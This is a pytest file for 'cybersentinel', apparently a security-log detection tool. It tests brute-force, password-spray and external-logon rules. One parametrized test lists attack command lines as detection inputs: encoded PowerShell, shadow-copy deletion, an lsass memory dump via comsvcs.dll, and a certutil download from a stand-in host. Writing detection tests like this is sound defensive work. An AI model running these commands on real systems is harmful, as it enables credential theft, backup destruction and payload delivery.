from pathlib import Path

import pandas as pd
import pytest

from cybersentinel.detection import DetectionConfig, analyze
from cybersentinel.models import Severity, normalize_frame
from cybersentinel.parsers import load_files

SAMPLES = Path(__file__).resolve().parent.parent / "sample_data"
T0 = pd.Timestamp("2026-03-02 09:00", tz="UTC")


def events(rows):
    """rows: (seconds_offset, action, user, ip, extra-dict)"""
    return normalize_frame(pd.DataFrame([
        {"timestamp": T0 + pd.Timedelta(seconds=s), "action": a, "user": u, "ip": ip, **(x or {})}
        for s, a, u, ip, *rest in rows for x in [rest[0] if rest else None]
    ]))


def rule_ids(result):
    return [f.rule_id for f in result.findings]


@pytest.fixture(scope="module")
def sample_result():
    files = [(p.name, p.read_bytes()) for p in (SAMPLES / "security_powershell_export.csv", SAMPLES / "vpn_auth.log")]
    df, _ = load_files(files)
    return analyze(df)


# ---------------------------------------------------------------- end-to-end on the sample scenario

def test_sample_scenario_detects_every_planted_attack(sample_result):
    by_rule = {}
    for f in sample_result.findings:
        by_rule.setdefault(f.rule_id, []).append(f)
    assert sample_result.errors == []
    assert {f.entities.get("user") for f in by_rule["BRUTE_FORCE"]} == {"administrator", "svc_sql"}
    assert by_rule["BRUTE_FORCE_SUCCESS"][0].entities == {"user": "administrator", "ip": "203.0.113.50"}
    assert by_rule["PASSWORD_SPRAY"][0].entities["ip"] == "198.51.100.7"
    assert by_rule["GROUP_MEMBER_ADDED"][0].entities == {"member": "svc_backup2", "group": "Administrators"}
    assert {f.entities["user"] for f in by_rule["ACCOUNT_LOCKOUT"]} == {"hr_admin", "svc_sql"}
    for rid in ("LOG_CLEARED", "USER_CREATED", "SERVICE_INSTALLED", "SUSPICIOUS_COMMAND"):
        assert rid in by_rule


def test_sample_findings_sorted_most_severe_first(sample_result):
    sev = [int(f.severity) for f in sample_result.findings]
    assert sev == sorted(sev, reverse=True)
    assert sample_result.findings[0].severity == Severity.CRITICAL


def test_sample_normal_activity_not_flagged(sample_result):
    flagged_users = {f.entities.get("user") for f in sample_result.findings if f.rule_id == "BRUTE_FORCE"}
    assert not flagged_users & {"jdoe", "asmith", "mlee", "kpatel", "rgarcia"}  # occasional typos only


def test_evidence_events_inherit_finding_severity(sample_result):
    crit = next(f for f in sample_result.findings if f.rule_id == "BRUTE_FORCE_SUCCESS")
    assert set(sample_result.events.loc[crit.evidence_index, "severity"]) == {"Critical"}


# ---------------------------------------------------------------- brute force thresholds

def test_brute_force_threshold_boundary():
    cfg = DetectionConfig(brute_force_threshold=5, brute_force_window_min=10)
    four = events([(i * 30, "logon_failure", "bob", "192.0.2.1") for i in range(4)])
    five = events([(i * 30, "logon_failure", "bob", "192.0.2.1") for i in range(5)])
    assert "BRUTE_FORCE" not in rule_ids(analyze(four, cfg))
    assert "BRUTE_FORCE" in rule_ids(analyze(five, cfg))


def test_brute_force_respects_window():
    # 5 failures, one every 4 minutes = 16 minutes total: no 10-minute window holds 5
    spread = events([(i * 240, "logon_failure", "bob", "192.0.2.1") for i in range(5)])
    assert "BRUTE_FORCE" not in rule_ids(analyze(spread, DetectionConfig(brute_force_window_min=10)))
    assert "BRUTE_FORCE" in rule_ids(analyze(spread, DetectionConfig(brute_force_window_min=20)))


def test_success_after_brute_force_requires_same_source_ip():
    base = [(i * 10, "logon_failure", "bob", "192.0.2.1") for i in range(6)]
    same = analyze(events(base + [(70, "logon_success", "bob", "192.0.2.1")]))
    other = analyze(events(base + [(70, "logon_success", "bob", "10.0.0.5")]))
    assert "BRUTE_FORCE_SUCCESS" in rule_ids(same)
    assert "BRUTE_FORCE_SUCCESS" not in rule_ids(other)


def test_success_long_after_burst_is_not_correlated():
    rows = [(i * 10, "logon_failure", "bob", "192.0.2.1") for i in range(6)] + \
           [(3 * 3600, "logon_success", "bob", "192.0.2.1")]
    assert "BRUTE_FORCE_SUCCESS" not in rule_ids(analyze(events(rows)))


def test_failures_without_user_group_by_ip():
    rows = [(i * 10, "logon_failure", None, "192.0.2.9") for i in range(6)]
    f = next(f for f in analyze(events(rows)).findings if f.rule_id == "BRUTE_FORCE")
    assert f.entities["ip"] == "192.0.2.9"


# ---------------------------------------------------------------- spray, external, commands

def test_password_spray_counts_distinct_accounts():
    one_user = events([(i * 10, "logon_failure", "bob", "192.0.2.1") for i in range(10)])
    many = events([(i * 10, "logon_failure", f"user{i}", "192.0.2.1") for i in range(5)])
    assert "PASSWORD_SPRAY" not in rule_ids(analyze(one_user))
    assert "PASSWORD_SPRAY" in rule_ids(analyze(many))
    assert "BRUTE_FORCE" not in rule_ids(analyze(many))  # one failure per account


def test_external_logon_flags_public_ips_only():
    df = events([(0, "logon_success", "bob", "10.1.2.3"), (5, "logon_success", "amy", "8.8.8.8", {"logon_type": "10"})])
    found = [f for f in analyze(df).findings if f.rule_id == "EXTERNAL_LOGON"]
    assert len(found) == 1 and found[0].entities["user"] == "amy" and found[0].severity == Severity.HIGH
    assert not [f for f in analyze(df, DetectionConfig(flag_external_logons=False)).findings
                if f.rule_id == "EXTERNAL_LOGON"]


@pytest.mark.parametrize("cmd,expected", [
    ("powershell.exe -nop -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBi", "Encoded PowerShell command"),
    ("vssadmin.exe delete shadows /all /quiet", "Shadow copy deletion"),
    ("rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 lsass.dmp full", "Credential dumping tool"),
    ("certutil -urlcache -split -f http://example.test/a.exe", "Certutil download"),
])
def test_suspicious_commands(cmd, expected):
    df = events([(0, "process_created", "bob", None, {"command_line": cmd, "host": "PC1"})])
    titles = [f.title for f in analyze(df).findings]
    assert f"Suspicious command: {expected}" in titles


def test_benign_command_not_flagged():
    df = events([(0, "process_created", "bob", None, {"command_line": "powershell.exe Get-ChildItem C:\\Users"})])
    assert analyze(df).findings == []


def test_non_privileged_group_is_low():
    df = events([(0, "group_member_added", "bob", None, {"message": "Group Name: Print Operators Team"})])
    f = analyze(df).findings[0]
    assert f.severity == Severity.LOW


def test_empty_input():
    r = analyze(normalize_frame(pd.DataFrame()))
    assert r.findings == [] and r.errors == [] and r.events.empty


def test_events_without_timestamps_skip_time_rules_without_error():
    df = normalize_frame(pd.DataFrame({"action": ["logon_failure"] * 10, "user": ["bob"] * 10}))
    r = analyze(df)
    assert r.errors == [] and "BRUTE_FORCE" not in rule_ids(r)
